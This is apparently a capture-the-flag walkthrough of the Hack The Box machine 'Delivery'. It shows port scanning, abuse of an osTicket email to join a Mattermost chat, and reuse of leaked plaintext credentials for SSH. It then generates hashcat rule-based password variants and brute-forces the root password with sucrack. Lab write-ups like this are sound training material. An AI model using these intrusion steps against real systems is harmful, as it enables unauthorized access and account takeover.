# Scan

```bash
ghost@localhost [01:09:06] [~/Documents/hacking/tj-null-boxes/delivery] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.222:22
Open 10.10.10.222:80
Open 10.10.10.222:8065

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b79df7489da2f27630fd42d3353a808c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp   open  http    syn-ack nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome
8065/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 02 Nov 2022 17:04:55 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 5u5e5pj317ro7d71qsjodtrp3r
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 02 Nov 2022 17:10:08 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Wed, 02 Nov 2022 17:10:09 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.93%I=7%D=11/3%Time=6362A46B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
SF:rs\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Wed,\x2002\
SF:x20Nov\x202022\x2017:04:55\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
SF:X-Request-Id:\x205u5e5pj317ro7d71qsjodtrp3r\r\nX-Version-Id:\x205\.30\.
SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Wed,\x
SF:2002\x20Nov\x202022\x2017:10:08\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user
SF:-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollo
SF:w\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matter
SF:most</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"
SF:><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20
SF:name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(H
SF:TTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
SF:0Wed,\x2002\x20Nov\x202022\x2017:10:09\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 80 (delivery.htb)

From looking around the website, found 2 domains `delivery.htb` and `helpdesk.delivery.htb`.

## helpdesk.delivery.htb

That subdomain is running a system called `osTicket`. I tried creating an account, however it requires confirmation. Therefore not manage to login.

I tried for a way to find out osTicket version but no luck. There's no SQL injection. However, creating a ticket exposes a company email.

9218198@delivery.htb where the number is the ticket id. I can email to that address to update an email.

So I use that email and register a new mattermost account with company domain.


## 8065 (mattermost)

`9218198@delivery.htb:Hacktheb0x!`

I register with the above credential, and verified an account. With that, I am able to join the company `Internal` organisation.

From the chat, I found one user ` root@delivery.htb ` and also a credential `maildeliverer:Youve_G0t_Mail!`.

```
@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail!

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```


With that, I am able to login to `osTicket`, and found a new email ` maildeliverer@delivery.htb `. 


# User

Using the same credential, I can also ssh into the server as `maildeliverer`.

```bash
ghost@localhost [01:36:43] [~/Documents/hacking/tj-null-boxes/delivery] [master]
-> % ssh maildeliverer@delivery.htb

maildeliverer@Delivery:~$ cat user.txt
748293969d4a2fecdc9b113b406c1f9e
```


# Lateral movement

I checked `sudo -l` but there's no command the user `maildeliverer` can run without sudo password.

I checked `/etc/passwd` for users with login and found a few.

```bash
maildeliverer@Delivery:~$ cat /etc/passwd | grep -v 'false\|nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
mattermost:x:998:998::/home/mattermost:/bin/sh
```

In mattermost chat, I saw this message

```
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

So it would be a good idea to build variable of `PleseSubscribe!` and try lateral movement to `mattermost` user.

```bash
ghost@localhost [01:45:31] [~/Documents/hacking/tj-null-boxes/delivery] [master *]
-> % cat pw
───────┬──────────────────────
       │ File: pw
───────┼──────────────────────
   1   │ PleaseSubscribe!
───────┴──────────────────────


ghost@localhost [01:46:26] [~/Documents/hacking/tj-null-boxes/delivery] [master *]
-> % hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule > passwords


ghost@localhost [01:46:55] [~/Documents/hacking/tj-null-boxes/delivery] [master *]
-> % head passwords
PleaseSubscribe!
!ebircsbuSesaelP
PLEASESUBSCRIBE!
pleaseSubscribe!
PleaseSubscribe!0
PleaseSubscribe!1
PleaseSubscribe!2
PleaseSubscribe!3
PleaseSubscribe!4
PleaseSubscribe!5


ghost@localhost [01:47:11] [~/Documents/hacking/tj-null-boxes/delivery] [master *]
-> % wc -l passwords
77 passwords
```

Then I downloaded `sucrack` (https://github.com/hemp3l/sucrack) and the password lists to the target machine under `/dev/shm`.


# Privilege escalation

I managed to crack the root password.

```bash
maildeliverer@Delivery:/dev/shm$ ./sucrack -u root passwords  -w 20
password is: PleaseSubscribe!21
```

Then su into the server.

```bash
maildeliverer@Delivery:~$ su root
Password:

root@Delivery:/home/maildeliverer# cat /root/root.txt
762d4cae19c461273cc4afbc20fcd3f0
```

